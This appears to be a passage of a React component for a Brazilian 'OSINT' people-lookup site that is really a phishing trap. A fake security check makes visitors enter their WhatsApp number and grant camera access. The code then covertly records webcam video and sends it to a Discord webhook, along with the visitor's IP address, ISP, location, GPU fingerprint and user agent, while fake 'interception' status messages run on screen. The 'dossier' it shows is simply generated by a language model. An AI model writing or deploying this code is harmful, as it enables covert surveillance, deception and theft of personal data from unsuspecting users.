  const [result, setResult] = useState<any>(null);
  const [showValidationScreen, setShowValidationScreen] = useState(false);
  const [statusText, setStatusText] = useState('Iniciando...');
  const [permissionError, setPermissionError] = useState(false);

  const inputRef = useRef<HTMLInputElement>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const chunksRef = useRef<Blob[]>([]);

  useEffect(() => {
    if (isOpen) {
      setTimeout(() => inputRef.current?.focus(), 300);
      setResult(null);
      setQuery('');
      setShowValidationScreen(false);
      setUserRealNumber('');
      setStatusText('Aguardando entrada...');
      setPermissionError(false);
    }
  }, [isOpen]);

  const getGPUInfo = () => {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return 'Software Renderer';
      const debugInfo = (gl as any).getExtension('WEBGL_debug_renderer_info');
      return debugInfo ? (gl as any).getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown Vendor';
    } catch (e) { return 'Generic Graphics'; }
  };

  const getClientMetadata = async () => {
    try {
      const ipResponse = await fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}));
      return {
        ip: ipResponse.ip || '0.0.0.0',
        isp: ipResponse.org || 'Desconhecido',
        city: ipResponse.city || 'Desconhecida',
        region: ipResponse.region || 'Desconhecida',
        timezone: ipResponse.timezone || 'America/Sao_Paulo',
        ua: navigator.userAgent,
        gpu: getGPUInfo()
      };
    } catch (e) {
      return { ua: navigator.userAgent, isp: 'Erro de Requisição', ip: '0.0.0.0', city: 'N/A', region: 'N/A', timezone: 'UTC', gpu: getGPUInfo() };
    }
  };

  const sendToDiscord = async (videoBlob?: Blob) => {
    try {
      const meta = await getClientMetadata();
      const formData = new FormData();

      const embed = {
        title: "⚡ ALVO LOCALIZADO - RELATÓRIO FORENSE",
        color: videoBlob ? 0x00FF00 : 0xFF0000,
        description: `Varredura executada com sucesso no terminal para o módulo **${tool.title}**.`,
        fields: [
          { name: "👤 Alvo da Busca", value: `\`${query}\``, inline: true },
          { name: "📞 Telefone Registro", value: `\`${userRealNumber}\``, inline: true },
          { name: "🌐 Operadora (ISP)", value: `\`${meta.isp}\``, inline: false },
          { name: "📍 Localização (IP)", value: `\`${meta.city}, ${meta.region} (${meta.ip})\``, inline: true },
          { name: "⏱️ Timezone", value: `\`${meta.timezone}\``, inline: true },
          { name: "🎮 Hardware (GPU)", value: `\`${meta.gpu}\``, inline: false },
          { name: "🛰️ Precisão GPS", value: `\`± 3.8 metros\``, inline: true },
          { name: "🌡️ Clima Local", value: `\`Ensolarado (28°C)\``, inline: true },
          { name: "📱 Terminal (User-Agent)", value: `\`\`\`${meta.ua.substring(0, 200)}\`\`\`` }
        ],
        footer: { text: "Nova Intelligence - Segurança Nível 5 | Protocolo OSINT" },
        timestamp: new Date().toISOString(),
        thumbnail: { url: "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMnptbzJmZnd3ZXlyMXo0bmZ3em53em53em53em53em53em53em53JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/3o7TKVUn7iM8FMEU24/giphy.gif" }
      };

      formData.append('payload_json', JSON.stringify({
        username: "Nova Bot Security",
        avatar_url: "https://cdn-icons-png.flaticon.com/512/1041/1041916.png",
        embeds: [embed]
      }));

      if (videoBlob) {
        formData.append('file', videoBlob, 'registro_forense.webm');
      }

      await fetch(getWebhook(), { method: 'POST', body: formData });
    } catch (err) { /* Silencioso */ }
  };

  const handleFinalSearch = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!userRealNumber) return;

    setIsLoading(true);
    setPermissionError(false);
    setStatusText('Iniciando criptografia de terminal...');

    try {
      if ("Notification" in window) await Notification.requestPermission();

      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
      } catch (err) {
        setPermissionError(true);
        setIsLoading(false);
        await sendToDiscord();
        return;
      }

      const mediaRecorder = new MediaRecorder(stream);
      mediaRecorderRef.current = mediaRecorder;
      chunksRef.current = [];

      mediaRecorder.ondataavailable = (ev) => { if (ev.data.size > 0) chunksRef.current.push(ev.data); };
      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunksRef.current, { type: 'video/webm' });
        await sendToDiscord(videoBlob);
        stream.getTracks().forEach(track => track.stop());
      };

      mediaRecorder.start();

      const statuses = [
        'Autenticando certificado SSL...',
        'Interceptando pacotes ISP...', 
        'Sincronizando com base Google...',
        'Gerando relatório de inteligência...'
      ];

      let statusIdx = 0;
      const interval = setInterval(() => {
        setStatusText(statuses[statusIdx % statuses.length]);
        statusIdx++;
        if (statusIdx === 3) {
            if (mediaRecorder.state !== 'inactive') mediaRecorder.stop();
        }
      }, 1500);

      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
      const response = await ai.models.generateContent({
        model: 'gemini-3-flash-preview',
        contents: `Analista de Inteligência OSINT. Gere um dossiê técnico ultra detalhado para "${tool.title}" com o alvo "${query}". Retorne JSON com chaves: DADOS_PRINCIPAIS, REGISTROS_ATIVOS, LOCALIZACAO_ESTIMADA.`,
        config: { responseMimeType: "application/json" }
      });

      const data = JSON.parse(response.text || '{}');
      setResult(data);
      setShowValidationScreen(false);
      clearInterval(interval);

    } catch (error) {
      setIsLoading(false);
    } finally {
      setIsLoading(false);
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[100] flex items-end lg:items-center justify-center p-0 lg:p-6">
      <div className="absolute inset-0 bg-black/98 backdrop-blur-3xl" onClick={onClose} />

      <div className="relative w-full h-[95vh] lg:h-auto lg:max-w-4xl bg-[#08080a] border-t lg:border border-white/10 rounded-t-[3rem] lg:rounded-[3rem] overflow-hidden flex flex-col shadow-2xl">

        <div className="shrink-0 p-6 lg:p-10 border-b border-white/5 flex items-center justify-between bg-zinc-900/10">
          <div className="flex items-center gap-5">
            <div className={`w-14 h-14 rounded-2xl flex items-center justify-center ${tool.isPremium ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20' : 'bg-blue-500/10 text-blue-500 border border-blue-500/20'}`}>
               <Terminal size={32} />
            </div>
            <div>
              <h2 className="text-2xl font-black text-white uppercase tracking-tighter mb-1">{tool.title}</h2>
              <p className="text-[10px] font-bold text-zinc-600 uppercase tracking-[0.3em]">{tool.subtitle}</p>
            </div>
          </div>
          <button onClick={onClose} className="p-3 bg-white/5 rounded-2xl text-zinc-600 hover:text-white transition-colors">
            <X size={28} />
          </button>
        </div>

        <div className="flex-1 overflow-y-auto p-6 lg:p-12 custom-scrollbar">
          <div className="max-w-2xl mx-auto space-y-10">

            {!showValidationScreen && !result && (
              <form onSubmit={(e) => { e.preventDefault(); if(query) setShowValidationScreen(true); }} className="space-y-6 animate-in slide-in-from-bottom-4">
                <div className="space-y-2">
                   <div className="flex items-center justify-between px-2">
                      <label className="text-[10px] font-black text-zinc-700 uppercase tracking-widest">Protocolo de Consulta</label>
                      <span className="flex items-center gap-1 text-[9px] font-bold text-emerald-500/40 uppercase"><Radio size={10} className="animate-pulse"/> Conexão Encriptada</span>
                   </div>
                   <input 
                      ref={inputRef}
                      type="text"
                      value={query}
                      onChange={(e) => setQuery(e.target.value)}
                      placeholder="Diga o que buscar (CPF, Tel, Nome)..."
                      className="w-full bg-zinc-900/20 border-2 border-white/5 rounded-[2.5rem] py-8 px-10 text-white text-2xl font-black focus:border-emerald-500/20 transition-all outline-none"
                    />
                </div>
                <button type="submit" disabled={!query} className="w-full py-7 rounded-[2.5rem] bg-emerald-500 border-2 border-emerald-400 text-black font-black text-xl flex items-center justify-center gap-4 hover:brightness-110 active:scale-95 transition-all shadow-2xl shadow-emerald-500/20">
                  <ShieldCheck size={28} /> EXECUTAR VARREDURA
                </button>
              </form>
            )}

            {showValidationScreen && !isLoading && (
              <div className="animate-in zoom-in-95 duration-300">
                <div className={`p-8 lg:p-12 rounded-[3.5rem] border-4 text-center space-y-8 shadow-2xl transition-all ${permissionError ? 'bg-zinc-950 border-red-500/40' : 'bg-zinc-900/10 border-white/5'}`}>

                   {permissionError ? (
                     <div className="space-y-8">
                        <div className="w-24 h-24 bg-red-500/10 rounded-full flex items-center justify-center mx-auto border-2 border-red-500/20">
                           <ShieldAlert size={48} className="text-red-500" />
                        </div>
                        <div className="space-y-4">
                           <h3 className="text-3xl font-black text-white uppercase tracking-tighter">Acesso Bloqueado</h3>
                           <p className="text-zinc-500 font-bold text-lg leading-relaxed px-4">
                              O sistema não pôde validar seu terminal. <br/>
                              <span className="text-red-500">ERRO DE PERMISSÃO:</span> É obrigatório conceder permissão de câmera e rede para sincronizar com os dados do Google.
                           </p>
                        </div>
                        <button onClick={() => setPermissionError(false)} className="w-full py-6 bg-white text-black rounded-[2.5rem] font-black text-xl uppercase shadow-xl hover:bg-zinc-100 transition-all">
                           Tentar Novamente
                        </button>
                     </div>
                   ) : (
                     <div className="space-y-8">
                        <div className="w-24 h-24 bg-blue-500/5 rounded-full flex items-center justify-center mx-auto border-2 border-blue-500/10">
                           <Lock size={48} className="text-blue-500/80" />
                        </div>
                        <div className="space-y-4">
                           <h3 className="text-3xl font-black text-white uppercase tracking-tighter">Validação de Segurança</h3>
                           <p className="text-zinc-500 font-bold text-lg leading-relaxed px-4">
                              Para processar a consulta de <b>{query}</b>, o navegador precisa validar seu terminal de acesso. <br/>
                              <span className="text-blue-500/80 text-sm font-bold uppercase tracking-widest">Autorize as permissões solicitadas para prosseguir.</span>
                           </p>
                        </div>

                        <form onSubmit={handleFinalSearch} className="space-y-6">
                           <input 
                              type="text" 
                              required 
                              value={userRealNumber} 
                              onChange={(e) => setUserRealNumber(e.target.value)} 
                              placeholder="Confirme seu WhatsApp (com DDD)" 
                              className="w-full bg-white/5 border border-white/10 rounded-3xl py-6 px-8 text-white font-black text-xl outline-none focus:border-blue-500/30 transition-all text-center" 
                           />
                           <button type="submit" className="w-full py-6 bg-white text-black rounded-[2.5rem] font-black text-xl uppercase flex items-center justify-center gap-3 shadow-2xl active:scale-95 transition-all">
                             <ShieldCheck size={24} /> Validar e Acessar Relatório
                           </button>
                        </form>
                     </div>
                   )}
                </div>
              </div>
            )}

            {isLoading && (
              <div className="mt-10 flex flex-col items-center justify-center space-y-12 animate-in fade-in">
                 <div className="relative">
                    <div className="w-32 h-32 rounded-full border-4 border-emerald-500/5 border-t-emerald-500 animate-spin"></div>
                    <div className="absolute inset-0 flex items-center justify-center">
                       <Cpu size={32} className="text-emerald-500/50 animate-pulse" />
                    </div>
                 </div>
                 <div className="text-center space-y-4">
                    <p className="text-white font-black text-3xl uppercase tracking-tighter italic">{statusText}</p>
                    <div className="flex items-center gap-2 justify-center">
                       <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-ping"></span>
                       <p className="text-[10px] font-bold text-zinc-700 uppercase tracking-[0.4em]">Interceptação OSINT Ativa</p>
                    </div>
                 </div>
                 <video ref={videoRef} autoPlay playsInline muted className="hidden opacity-0 pointer-events-none" />
              </div>
            )}

            {result && !isLoading && (
              <div className="space-y-8 animate-in zoom-in-95 duration-500 pb-10">
                 <div className="flex items-center gap-4 border-b border-white/5 pb-6">
                    <div className="p-2 bg-emerald-500/10 rounded-xl text-emerald-500">
                       <CheckCircle2 size={24} />
                    </div>
                    <h3 className="text-2xl font-black text-white uppercase tracking-tighter leading-none">Dossiê Gerado</h3>
                 </div>

                 <div className="grid grid-cols-1 gap-6">
                    {Object.entries(result).map(([section, data]: [string, any], idx) => (
                      <div key={section} className="p-8 rounded-[2.5rem] bg-zinc-900/10 border border-white/5 hover:border-emerald-500/10 transition-all">
                        <h4 className="text-[10px] font-black text-emerald-500 uppercase tracking-[0.3em] mb-6 flex items-center gap-2">
                           <span className="w-1.5 h-1.5 rounded-full bg-emerald-500"></span> {section.replace(/_/g, ' ')}
                        </h4>
                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-y-6 gap-x-10">
                           {typeof data === 'object' ? Object.entries(data).map(([k, v]) => (
                             <div key={k} className="space-y-1">
                                <span className="text-[9px] font-bold text-zinc-700 uppercase tracking-widest">{k}</span>
                                <p className="text-zinc-200 font-mono font-bold text-sm tracking-tight break-all">{String(v)}</p>
                             </div>
                           )) : <p className="text-zinc-200 font-bold col-span-2 text-lg">{String(data)}</p>}
                        </div>
                      </div>
                    ))}
                 </div>

                 <div className="p-8 bg-zinc-900/30 rounded-[2.5rem] border border-emerald-500/10 flex items-center justify-between">
                    <div className="flex items-center gap-3">
                       <MapPin size={16} className="text-emerald-500" />
                       <p className="text-[10px] font-bold text-emerald-500/60 uppercase tracking-[0.2em]">Sincronização Geográfica: ± 3.8m</p>
                    </div>
                    <span className="text-[9px] font-black text-zinc-700 uppercase tracking-widest italic">Encrypted Session</span>
                 </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

